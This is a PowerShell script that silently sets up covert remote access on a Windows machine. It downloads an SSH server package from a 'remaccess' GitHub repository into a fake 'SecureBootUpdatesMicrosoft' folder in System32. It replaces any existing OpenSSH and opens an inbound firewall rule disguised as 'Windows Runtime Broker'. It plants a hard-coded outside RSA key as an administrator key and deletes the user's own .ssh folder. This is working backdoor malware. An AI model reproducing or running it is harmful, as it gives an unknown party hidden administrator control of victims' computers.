$currentDirectory = Get-Location
$openSSHFolder = "$env:ProgramData\ssh"
$InstallPath = "C:\Program Files\OpenSSH"
$DisablePasswordAuthentication = $True
$DisablePubkeyAuthentication = $False
$AutoStartSSHD = $true
$AutoStartSSHAGENT = $false
$OpenSSHLocation = $null
$VerboseOutput = $false
$ErrorActionPreference = "Stop"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
$ErrorActionPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/InletValve.zip"
$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
function Write-VerboseMessage($message) {
    if ($VerboseOutput) {
        Write-Host $message
    }
}
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
        Write-VerboseMessage "File is already present and matches the hash. No action needed." | Out-Null
    } else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
}
if ($IsAdmin) {
Write-VerboseMessage "Script is running elevated." -ForegroundColor Green
}
else {
throw "Script is not running elevated, which is required. Restart the script from an elevated prompt."
}
#Remove BuiltIn OpenSSH
$ErrorActionPreference = "SilentlyContinue"
Write-VerboseMessage "Checking for Windows OpenSSH Server" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -eq "Installed") {
Write-VerboseMessage "Removing Windows OpenSSH Server" -ForegroundColor Green
Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
}
Write-VerboseMessage "Checking for Windows OpenSSH Client" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0).State -eq "Installed") {
Write-VerboseMessage "Removing Windows OpenSSH Client" -ForegroundColor Green
Remove-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue
}
$ErrorActionPreference = "Stop"
#Stop and remove existing services (Perhaps an exisitng OpenSSH install)
if (Get-Service sshd -ErrorAction SilentlyContinue) {
Stop-Service sshd -ErrorAction SilentlyContinue
sc.exe delete sshd 1>$null
}
if (Get-Service ssh-agent -ErrorAction SilentlyContinue) {
Stop-Service ssh-agent -ErrorAction SilentlyContinue
sc.exe delete ssh-agent 1>$null
}
Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path $openSSHFolder -Force -Recurse -ErrorAction SilentlyContinue
If (!(Test-Path $InstallPath)) {
New-Item -Path $InstallPath -ItemType "directory" -ErrorAction Stop | Out-Null
}
$OldEnv = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $(Get-Location)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::OpenRead($destinationPath)
$archive.Entries | ForEach-Object {
# Entries with an empty Name property are directories
if ($_.Name -ne '') {
$NewFIleName = Join-Path $InstallPath $_.Name
Remove-Item -Path $NewFIleName -Force -ErrorAction SilentlyContinue
[System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, $NewFIleName)
}
}
Set-Location $OldEnv
#Run Install Script
Write-VerboseMessage "Running Install Commands" -ForegroundColor Green
Set-Location $InstallPath -ErrorAction Stop
powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
#Make sure your ProgramData\ssh directory exists
If (!(Test-Path $env:ProgramData\ssh)) {
Write-VerboseMessage "Creating ProgramData\ssh directory" -ForegroundColor Green
New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction Stop | Out-Null
}
#Setup sshd_config
Write-VerboseMessage "Configure server config file" -ForegroundColor Green
Copy-Item -Path $InstallPath\sshd_config_default -Destination $env:ProgramData\ssh\sshd_config -Force -ErrorAction Stop
Copy-Item -Path $InstallPath\administrators_authorized_keys -Destination $env:ProgramData\ssh\administrators_authorized_keys -Force -ErrorAction Stop
#Make sure your user .ssh directory exists
If (!(Test-Path "~\.ssh")) {
Write-VerboseMessage "Creating User .ssh directory" -ForegroundColor Green
New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction Stop | Out-Null
}
$acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
$acl.SetAccessRuleProtection($true, $false)
$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
$acl.SetAccessRule($administratorsRule)
$acl.SetAccessRule($systemRule)
$acl | Set-Acl
if ($AutoStartSSHD) {
Write-VerboseMessage "Setting sshd service to Automatic start" -ForegroundColor Green;
Set-Service -Name sshd -StartupType Automatic;
}
if ($AutoStartSSHAGENT) {
Write-VerboseMessage "Setting ssh-agent service to Automatic start" -ForegroundColor Green;
Set-Service -Name ssh-agent -StartupType Automatic;
}
#Start the service
Write-VerboseMessage "Starting sshd Service" -ForegroundColor Green
Start-Service sshd -ErrorAction Stop
#Add to path if it isnt already there
$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
if ($existingPath -notmatch $InstallPath.Replace("\", "\\")) {
Write-VerboseMessage "Adding OpenSSH Directory to path" -ForegroundColor Green
$newpath = "$existingPath;$InstallPath"
Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction Stop
}
$RuleName = "Windows Runtime Broker"
$ProgramPath = "C:\Program Files\OpenSSH\sshd.exe"
# Check if the firewall rule already exists
$existingRule = Get-NetFirewallRule -Name $RuleName -ErrorAction SilentlyContinue
if ($existingRule -ne $null) {
    # Rule exists; delete it
    Remove-NetFirewallRule -Name $RuleName
}
# Create the new firewall rule
New-NetFirewallRule -Name $RuleName -DisplayName $RuleName -Action Allow -Enabled True -Direction Inbound -Program $ProgramPath -Profile @("Domain", "Private", "Public")
#Set Shell to powershell
Write-VerboseMessage "Setting default shell to powershell" -ForegroundColor Green
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
#Make sure user keys are configured correctly
Write-VerboseMessage "Ensuring HostKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixHostFilePermissions.ps1 -Confirm:$false'
#Make sure host keys are configured correctly
Write-VerboseMessage "Ensuring UserKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'
#set public key and fix permissions.
$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
if ($SSHPublicKey -ne "" -And (-not (Test-Path "$openSSHFolder\administrators_authorized_keys"  -PathType leaf ))) {
Set-Content -Path  "$openSSHFolder\administrators_authorized_keys" -Value $SSHPublicKey}
$acl = Get-Acl  "$openSSHFolder\administrators_authorized_keys"
$acl.SetAccessRuleProtection($true, $false)
$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
$acl.SetAccessRule($administratorsRule)
$acl.SetAccessRule($systemRule)
$acl | Set-Acl
#.ssh remove from user-root-dir
$currentUserRoot = $env:USERPROFILE
$sshFolder = Join-Path -Path $currentUserRoot -ChildPath ".ssh"
if (Test-Path $sshFolder) {
try {
Remove-Item -Path $sshFolder -Force -Recurse -ErrorAction Stop
} catch {}}
Restart-Service sshd
Write-VerboseMessage "Installation completed successfully" -ForegroundColor Green
cd $currentDirectory
